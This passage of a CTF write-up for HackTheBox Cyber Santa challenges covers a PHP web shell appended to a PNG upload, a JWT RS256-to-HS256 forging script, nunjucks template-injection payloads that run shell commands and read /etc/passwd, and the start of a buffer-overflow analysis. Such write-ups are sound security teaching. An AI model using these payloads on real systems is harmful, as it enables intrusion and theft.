class="language-plaintext highlighter-rouge">PHP</code> web shell but it recognized that it wasn’t an image.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta30.png" alt="" /></p><p>I tried a few ways to circumvent the check and ended up with appending a webshell to the end of a PNG image found on the page and renaming the image to <code class="language-plaintext highlighter-rouge">shell.php</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"&lt;?php system(</span><span class="se">\$</span><span class="s2">_GET[</span><span class="se">\"</span><span class="s2">cmd</span><span class="se">\"</span><span class="s2">]); ?&gt;"</span>  <span class="o">&gt;&gt;</span> cherry.png
<span class="nv">$ </span><span class="nb">mv </span>cherry.png shell.php
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta31.png" alt="" /></p><p>After uploading, we observe the profile picture of my account was updated to reflect our file. We can right-click on the image and click to view it in the browser.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta32.png" alt="" /></p><p>Instead of seeing an image, we see a butch of unprintable characters. This was a sign that our file was interpreted not as an image, but as a valid <code class="language-plaintext highlighter-rouge">PHP</code> page! Since we are using <code class="language-plaintext highlighter-rouge">cmd</code> to trigger the execution, we can test it by appending <code class="language-plaintext highlighter-rouge">?cmd=id</code> to the URL.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta33.png" alt="" /></p><p>Scrolling down, we see the output of the <code class="language-plaintext highlighter-rouge">id</code> command, which proves that we have successfully established our web shell. I then proceed to dig around the file system and found the flag in the root directory by setting the <code class="language-plaintext highlighter-rouge">cmd</code> parameter to <code class="language-plaintext highlighter-rouge">ls /</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta34.png" alt="" /></p><p>I then proceeded to read the flag by setting the <code class="language-plaintext highlighter-rouge">cmd</code> parameter to <code class="language-plaintext highlighter-rouge">cat /flag_65890d927c37c33.txt</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta35.png" alt="" /></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{br4k3_au7hs_g3t_5h3lls}</code></p><h2 id="naughty-or-nice-day-5">Naughty or Nice (Day 5)</h2><blockquote><p>All the Santa’s nice elves have been added to the naughty list by the wicked elves and Santa is mad! He asked you to hack into the admin account of the Naughty or Nice portal and retrieve the magic flag that will let Santa finally banish the evil elves from the north pole!<br /> Downloadble content: <code class="language-plaintext highlighter-rouge">web_naughty_or_nice.zip</code></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta36.png" alt="" /></p><p>The card in the middle was clickable, and clicking it shows a list of names in the Naughty list.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta37.png" alt="" /></p><p>On the bottom right of the page, we can click on the <code class="language-plaintext highlighter-rouge">Login Here</code> and we are brought to the login page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta38.png" alt="" /></p><p>We can then go ahead and register a new account by clicking on <code class="language-plaintext highlighter-rouge">Create one!</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta39.png" alt="" /></p><p>After logging with our credentials, we are brought to <code class="language-plaintext highlighter-rouge">/dashboard</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta40.png" alt="" /></p><p>In our cookies, we see that we had a cookie <code class="language-plaintext highlighter-rouge">session</code> containing a JWT token.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta41.png" alt="" /></p><p>Decoding it, we can see its contents.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta42.png" alt="" /></p><p>We could see our username in there and there was even what seems to be a public key inside too? To learn more about the JWT usage, we can look into the contents of <code class="language-plaintext highlighter-rouge">web_naughty_or_nice.zip</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="nb">.</span>
├── build-docker.sh
├── challenge
│   ├── database.js
│   ├── helpers
│   │   ├── CardHelper.js
│   │   └── JWTHelper.js
│   ├── index.js
│   ├── middleware
│   │   └── AuthMiddleware.js
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── ...
│   └── views
│       ├── ...
├── config
│   └── supervisord.conf
├── Dockerfile
└── flag
</pre></table></code></div></div><p>Lets take a look at <code class="language-plaintext highlighter-rouge">challenge/helpers/JWTHelper.js</code>.</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsonwebtoken</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">NodeRSA</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-rsa</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">keyPair</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NodeRSA</span><span class="p">({</span><span class="na">b</span><span class="p">:</span> <span class="mi">512</span><span class="p">}).</span><span class="nx">generateKeyPair</span><span class="p">();</span>
<span class="kd">const</span> <span class="nx">publicKey</span> <span class="o">=</span> <span class="nx">keyPair</span><span class="p">.</span><span class="nx">exportKey</span><span class="p">(</span><span class="dl">'</span><span class="s1">public</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">privateKey</span> <span class="o">=</span> <span class="nx">keyPair</span><span class="p">.</span><span class="nx">exportKey</span><span class="p">(</span><span class="dl">'</span><span class="s1">private</span><span class="dl">'</span><span class="p">)</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
    <span class="k">async</span> <span class="nx">sign</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">data</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="p">{</span><span class="na">pk</span><span class="p">:</span><span class="nx">publicKey</span><span class="p">});</span>
        <span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">privateKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithm</span><span class="p">:</span><span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span> <span class="p">}))</span>
    <span class="p">},</span>
    <span class="k">async</span> <span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">]</span> <span class="p">}));</span>
    <span class="p">}</span>
<span class="p">}</span> 
</pre></table></code></div></div><p>We see that in the <code class="language-plaintext highlighter-rouge">verify()</code> function, not only does it support the <code class="language-plaintext highlighter-rouge">RS256</code> algorithm, it also supports <code class="language-plaintext highlighter-rouge">HS256</code>. This actually opens up a vulnerability where we could trick the website into using <code class="language-plaintext highlighter-rouge">HS256</code> and using the public key as the secret key to verify the JWT token.</p><p>To do this in Python, I used <code class="language-plaintext highlighter-rouge">PyJWT</code>, which can be installed by <code class="language-plaintext highlighter-rouge">pip3 install pyjwt</code>. After installing, some changes to it were need to be done. First, we will need to locate where the package was installed. For me, it was located at <code class="language-plaintext highlighter-rouge">~/.local/lib/python3.9/site-packages/jwt/</code>. Next we will need to make the following changes to empty the contents of all <code class="language-plaintext highlighter-rouge">invalid_strings</code> lists found in <code class="language-plaintext highlighter-rouge">~/.local/lib/python3.9/site-packages/jwt/algorithms.py</code>.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">invalid_strings</span> <span class="o">=</span> <span class="p">[]</span>
</pre></table></code></div></div><p>With that done, we can construct our script to create our own JWT token.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">jwt</span>

<span class="n">public_key</span> <span class="o">=</span> <span class="s">"-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAi2DbW9UjVAfiDou2DWZS</span><span class="se">\n</span><span class="s">gClVVt3uaP1sGgBcjPQUXYYU3VSBUVViAFEh4koWB8vicqebZg4KSxOgL3xhbp5f</span><span class="se">\n</span><span class="s">d713/rqnSts5s3b90u+lWSFI5kfULFSTgUnd52pJz4NUdxy9wUrMgrrluWkmSoCe</span><span class="se">\n</span><span class="s">ULC5hrDEuhju+7P1k/T/LPBzKL3RfK54ZPxPB+DAUQw8zkgyYJVTAUy/u+cIAfkm</span><span class="se">\n</span><span class="s">UXlT3lYk5Pgb4Wd0sjke+EAelzl7rGs7qXYMkXw7tIb/JKfJyNH6GjjSjms7EUH3</span><span class="se">\n</span><span class="s">WILvF6dDcd8wB2Qs8n9x7iZrGZYYG+XQ9qbgicf7xu9zxQqYyakqsu2kvbbRjb0e</span><span class="se">\n</span><span class="s">lQIDAQAB</span><span class="se">\n</span><span class="s">-----END PUBLIC KEY-----"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span> <span class="s">"pk"</span><span class="p">:</span> <span class="n">public_key</span><span class="p">}</span>

<span class="n">enc</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">public_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s">"HS256"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
</pre></table></code></div></div><p>Regarding the changes made to <code class="language-plaintext highlighter-rouge">~/.local/lib/python3.9/site-packages/jwt/algorithms.py</code>, the library throws an exception if the given key contains strings that identify it as a public key such as <code class="language-plaintext highlighter-rouge">-----BEGIN PUBLIC KEY-----</code> or <code class="language-plaintext highlighter-rouge">ssh-rsa</code>. Therefore, we will need to empty <code class="language-plaintext highlighter-rouge">invalid_strings</code> so that it would no longer throw an exception.</p><p>After executing the script, we can copy the JWT token and paste into our cookie and then reload the page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta43.png" alt="" /></p><p>We no longer see the <code class="language-plaintext highlighter-rouge">Access Denied</code> error and we have successfully logged in as <code class="language-plaintext highlighter-rouge">admin</code>. On this page, we see a list of elves marked as naughty. Clicking on any of the buttons in the <code class="language-plaintext highlighter-rouge">Action</code> column, we can update their names and even their naughty/nice status.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta44.png" alt="" /></p><p>Lets take a look at <code class="language-plaintext highlighter-rouge">challenge/routes/index.js</code> to see how the elves are displayed in the home page.</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">db</span><span class="p">.</span><span class="nx">listNames</span><span class="p">()</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">elfList</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">CardHelper</span><span class="p">.</span><span class="nx">generateCard</span><span class="p">(</span><span class="nx">elfList</span><span class="p">)</span>
                <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">cardHTML</span> <span class="o">=&gt;</span> <span class="p">{</span>
                        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">cardHTML</span><span class="p">);</span>
                <span class="p">})</span>
                <span class="p">.</span><span class="k">catch</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Something went wrong!</span><span class="dl">'</span><span class="p">)));</span>
        <span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>Despite having an interaction with database, all the statements used were using prepared statements, so there was no SQL injection vulnerability to exploit. Here, we see that <code class="language-plaintext highlighter-rouge">CardHelper</code> is being used to generate the list for displaying to the user. The code for <code class="language-plaintext highlighter-rouge">CardHelper</code> can be found in <code class="language-plaintext highlighter-rouge">challenge/helpers/CardHelper.js</code></p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">nunjucks</span>   <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">nunjucks</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
    <span class="k">async</span> <span class="nx">generateCard</span><span class="p">(</span><span class="nx">elfList</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="k">async</span> <span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">NaughtyNames</span> <span class="o">=</span> <span class="nx">NiceNames</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">&lt;br&gt;</span><span class="dl">'</span><span class="p">;</span>
                <span class="k">for</span><span class="p">(</span><span class="nx">elfData</span> <span class="k">of</span> <span class="nx">elfList</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">type</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">naughty</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">NaughtyNames</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">NaughtyNames</span><span class="p">}</span><span class="s2">\n</span><span class="p">${</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">elf_name</span><span class="p">}</span><span class="s2">&lt;br&gt;`</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">type</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">nice</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">NiceNames</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">NiceNames</span><span class="p">}</span><span class="s2">\n</span><span class="p">${</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">elf_name</span><span class="p">}</span><span class="s2">&lt;br&gt;`</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="nx">card</span> <span class="o">=</span> <span class="s2">`
                        {% extends "card.html" %}
                        {% block card %}
                        &lt;div class="card"&gt;
                                &lt;div class="card-page cart-page-front"&gt;
                                        &lt;div class="card-page cart-page-outside"&gt;&lt;/div&gt;
                                        &lt;div class="card-page cart-page-inside"&gt;
                                        &lt;p&gt;&lt;span class='nheader green'&gt;Nice List&lt;/span&gt;
                                                </span><span class="p">${</span><span class="nx">NiceNames</span><span class="p">}</span><span class="s2">
                                        &lt;/p&gt;
                                        &lt;/div&gt;
                                &lt;/div&gt;
                                &lt;div class="card-page cart-page-bottom"&gt;
                                        &lt;p&gt;&lt;span class='nheader red'&gt;Naughty List&lt;/span&gt;
                                                </span><span class="p">${</span><span class="nx">NaughtyNames</span><span class="p">}</span><span class="s2">
                                        &lt;/p&gt;
                                &lt;/div&gt;
                        &lt;/div&gt;
                        {% endblock %}
                `</span><span class="p">;</span>
                <span class="nx">resolve</span><span class="p">(</span><span class="nx">nunjucks</span><span class="p">.</span><span class="nx">renderString</span><span class="p">(</span><span class="nx">card</span><span class="p">));</span>
            <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">reject</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">})</span>
    <span class="p">}</span>
<span class="p">};</span> 
</pre></table></code></div></div><p>From here, we see that the website is using <code class="language-plaintext highlighter-rouge">nunjucks</code>, a templating engine for Javascript. Knowing this, lets test for Server-Side Template Injection by setting the name of an elf to <code class="language-plaintext highlighter-rouge">{{7 * 7}}</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta45.png" alt="" /></p><p>After updating it and if we go back to the home page and open up the card,</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta46.png" alt="" /></p><p>We see that <code class="language-plaintext highlighter-rouge">49</code> was rendered in the naughty list, therefore proving that a Server-Side Template Injection vulnerability existed!</p><p>Searching online, I found a working payload <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">here</a>.</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{{</span><span class="nx">range</span><span class="p">.</span><span class="kd">constructor</span><span class="p">(</span><span class="dl">"</span><span class="s2">return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')</span><span class="dl">"</span><span class="p">)()}}</span>
</pre></table></code></div></div><p>I then went ahead and updated the name of an elf to the payload above.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta47.png" alt="" /></p><p>I then refreshed the home page and saw that we managed to execute the code!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta48.png" alt="" /></p><p>Now that we can execute commands, we can now read the flag by repeating the steps earlier but with the following payload.</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{{</span><span class="nx">range</span><span class="p">.</span><span class="kd">constructor</span><span class="p">(</span><span class="dl">"</span><span class="s2">return global.process.mainModule.require('child_process').execSync('cat /flag.txt')</span><span class="dl">"</span><span class="p">)()}}</span>
</pre></table></code></div></div><p>The location of the flag was exposed in the <code class="language-plaintext highlighter-rouge">Dockerfile</code>, which had a command that moved the flag to the root directory.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta49.png" alt="" /></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}</code></p><h1 id="pwn">Pwn</h1><h2 id="mrsnowy-day-1">MrSnowy (Day 1)</h2><blockquote><p>There is ❄️ snow everywhere!! Kids are playing around, everything looks amazing. But, this ☃️ snowman… it scares me.. He is always 👀 staring at Santa’s house. Something must be wrong with him.<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">pwn_mr_snowy.zip</code></p></blockquote><p>Inside the <code class="language-plaintext highlighter-rouge">pwn_mr_snowy.zip</code>, we get a binary <code class="language-plaintext highlighter-rouge">mr_snowy</code>.</p><p>Opening it up with <code class="language-plaintext highlighter-rouge">ghidra</code>, we jump to the <code class="language-plaintext highlighter-rouge">main</code> function:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
    <span class="n">setup</span><span class="p">();</span>
    <span class="n">banner</span><span class="p">();</span>
    <span class="n">snowman</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">setup()</code> and <code class="language-plaintext highlighter-rouge">banner()</code> were mainly just UI-related functions, so lets zoom into <code class="language-plaintext highlighter-rouge">snowman()</code>.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">snowman</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
    <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">local_48</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    
    <span class="n">printstr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_004019a8</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_48</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">local_48</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printstr</span><span class="p">(</span><span class="s">"[*] It</span><span class="se">\'</span><span class="s">s just a cute snowman after all, nothing to worry about..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">color</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] Mission failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_0040161a</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00401664</span><span class="p">);</span>
            <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mh">0x45</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">investigate</span><span class="p">();</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We see that it reads in 2 bytes into a buffer of 64 bytes, followed by calling <code class="language-plaintext highlighter-rouge">atoi()</code> on it to convert the contents into an integer. And if the integer is not equals to <code class="language-plaintext highlighter-rouge">1</code>, then it will just exit. Therefore we may want to enter <code class="language-plaintext highlighter-rouge">1</code> for this.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./mr_snowy                   

                                                                                                                                                        
<span class="o">[</span>Location]: 🎅 Santa<span class="s1">'s garden..
   _____    *  *  *  *  *     *  *                           
   |   |        *   *    *   * **                         
  _|___|_     *  *  *   *  **  *                                      
  ( 0 0 )   *   *  *   * *   * *   *                                 
 (   *   )    *   *    *    *   * * 
(    *    )      *  *   *  *   *  *            
 \_______/    *   *   *  ***   **                                                                             


[*] This snowman looks sus..  
                                                                                                                                                        
1. Investigate 🔎 
2. Let it be   ⛄ 
&gt; 1 
                                                                                                                                                        
[!] After some investigation, you found a secret camera inside the snowman! 
                                                                                                                                                        
1. Deactivate ⚠ 
2. Break it   🔨
</span></pre></table></code></div></div><p>Passing that check, we see that there is a call to <code class="language-plaintext highlighter-rouge">investigate()</code>.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>
<span class="kt">void</span> <span class="nf">investigate</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
    <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">local_48</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">printstr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00401878</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_48</span><span class="p">,</span><span class="mh">0x108</span><span class="p">);</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">local_48</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\x1b</span><span class="s">[1;31m"</span><span class="p">);</span>
        <span class="n">printstr</span><span class="p">(</span><span class="s">"[!] You do not know the password!</span><span class="se">\n</span><span class="s">[-] Mission failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="mh">0x16</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">local_48</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\x1b</span><span class="s">[1;31m"</span><span class="p">);</span>
        <span class="n">printstr</span><span class="p">(</span>
            <span class="s">"[!] This metal seems unbreakable, the elves seem to have put a spell on it..</span><span class="se">\n</span><span class="s">[-] Mission failed!</span><span class="se">\n</span><span class="s">"</span>
            <span class="p">);</span>
            <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="mh">0x16</span><span class="p">);</span>
    <span class="p">}</span>
